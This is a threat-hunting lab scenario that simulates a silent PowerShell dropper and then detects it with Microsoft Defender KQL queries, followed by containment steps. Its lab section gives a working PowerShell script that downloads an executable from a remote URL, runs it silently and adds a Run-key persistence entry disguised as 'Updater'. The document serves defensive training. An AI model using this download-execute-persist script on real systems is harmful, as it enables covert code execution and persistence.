# Threat Hunt Scenario: Silent PowerShell Dropper with Persistence

## 1. Overview
This scenario simulates an adversary using PowerShell to download and silently execute an installer (e.g., 7-Zip) into `C:\ProgramData\` and establish persistence through a Run registry key. The objective is to practice hunting this activity using Microsoft Defender Advanced Hunting with KQL queries.

---

## 2. Rationale
Recent threat intel highlights increased abuse of **PowerShell one-liners** to deliver droppers and set persistence without writing custom malware. Security leadership requested a hunt to validate whether our environment has been exposed to this technique.

---

## 3. Hypothesis
If an attacker abused PowerShell to fetch and silently run an executable, then we should observe:
- PowerShell execution with suspicious parameters (`Invoke-WebRequest`, `/S`, `-ExecutionPolicy Bypass`)
- A file created in `C:\ProgramData\` ending in `.exe`
- Silent execution of that file shortly after download
- Registry persistence via `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`

---

## 4. Data Sources
Microsoft Defender for Endpoint (Advanced Hunting tables):
- `DeviceProcessEvents`
- `DeviceNetworkEvents`
- `DeviceFileEvents`
- `DeviceRegistryEvents`

---

## 5. Bad Actor Steps (Lab Simulation)
On a **lab VM**, execute:
```powershell
# Lab script using GitHub release URL
$uri = "https://github.com/charliecash310/silent-dropper-lab/releases/download/v1.0/7z2501-x64.exe"
$out = "C:\ProgramData\7z2408-x64.exe"

Write-Host "Testing connectivity to $uri ..."
try { $uriObj = [uri]$uri } catch { Write-Error "Invalid URI"; exit 1 }

# Test connection (HEAD)
try {
    $r = Invoke-WebRequest -Uri $uri -Method Head -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
    Write-Host "HEAD OK: $($r.StatusCode)"
} catch {
    Write-Warning "HEAD failed: $($_.Exception.Message) -- will try GET"
}

# Try download
try {
    Write-Host "Downloading via Invoke-WebRequest..."
    Invoke-WebRequest -Uri $uri -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop
    Write-Host "Downloaded to $out"
} catch {
    Write-Warning "Invoke-WebRequest failed: $($_.Exception.Message)"
    try {
        Write-Host "Trying BITS fallback..."
        Start-BitsTransfer -Source $uri -Destination $out -ErrorAction Stop
        Write-Host "BITS download completed"
    } catch {
        Write-Error "BITS failed: $($_.Exception.Message). Exiting."
        exit 1
    }
}

# Confirm file
if (-not (Test-Path $out)) { Write-Error "Download didn't produce file. Exiting."; exit 1 }

# Optional: compute SHA256 for record
try { Get-FileHash -Path $out -Algorithm SHA256 } catch {}

# Run silently (for installers that accept /S)
try {
    Start-Process -FilePath $out -ArgumentList "/S" -Wait -ErrorAction Stop
    Write-Host "Process executed (silent argument)."
} catch {
    Write-Warning "Start-Process failed (maybe not an installer): $($_.Exception.Message)"
}

# Persistence (HKCU Run key)
try {
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $out -PropertyType String -Force
    Write-Host "Created Run key -> $out"
} catch {
    Write-Warning "Failed to create Run key: $($_.Exception.Message)"
}

```
This generates telemetry for network, file, process, and registry activities.

---

## 6. Hunting Queries (KQL)

### Suspicious PowerShell Execution
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("Invoke-WebRequest", "/S", "-ExecutionPolicy Bypass", "-NoProfile")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
```

### Network Downloads via PowerShell
```kql
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("powershell.exe", "pwsh.exe")
| project Timestamp, DeviceName, AccountName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessCommandLine
| order by Timestamp desc
```

### File Drops into ProgramData
```kql
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType == "FileCreated" and FolderPath has @"C:\\ProgramData\\"
| where FileName endswith ".exe"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, InitiatingProcessCommandLine
```

### Silent Execution of Dropped Files
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FolderPath has @"C:\\ProgramData\\"
| where ProcessCommandLine has_any ("/S","/silent","/quiet")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Persistence via Run Key
```kql
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where RegistryKey has @"\\Run"
| project Timestamp, DeviceName, AccountName, RegistryKey, RegistryValueName, RegistryValueData
```

### Unified Timeline
```kql
union
(DeviceProcessEvents | where FileName in~ ("powershell.exe","pwsh.exe") | project Timestamp, DeviceName, AccountName, Evidence="Proc", Details=ProcessCommandLine),
(DeviceNetworkEvents | where InitiatingProcessFileName in~ ("powershell.exe","pwsh.exe") | extend Details=strcat(RemoteUrl, " ", RemoteIP) | project Timestamp, DeviceName, AccountName, Evidence="Net", Details),
(DeviceFileEvents | where ActionType=="FileCreated" | project Timestamp, DeviceName, AccountName, Evidence="File", Details=strcat(FolderPath,"\\",FileName)),
(DeviceRegistryEvents | where RegistryKey has @"\\Run" | project Timestamp, DeviceName, AccountName, Evidence="Reg", Details=strcat(RegistryKey,"=",RegistryValueData))
| order by Timestamp asc
```

---

## 7. Analyst Workflow
1. Run PowerShell query → find seed events.
2. Pivot to network, file, process, and registry queries.
3. Use unified timeline query for correlation.
4. If chain is confirmed → escalate to incident.

---

## 8. Containment & Eradication
- Isolate affected device in Defender.
- Kill malicious processes.
- Remove dropped EXE.
- Delete persistence Run key.
- Trigger AV scan.
- Reset user credentials if needed.

---

## 9. Success Criteria
- Detect at least three linked events: download → file creation → silent execution.
- Registry Run key persistence tied to same executable.

---

## 10. Deliverables
- Completed Threat Hunt Scenario Template (this doc)
- Screenshots of Advanced Hunting results
- Final Threat Hunt Report (using report template)
- Upload to GitHub for portfolio

---
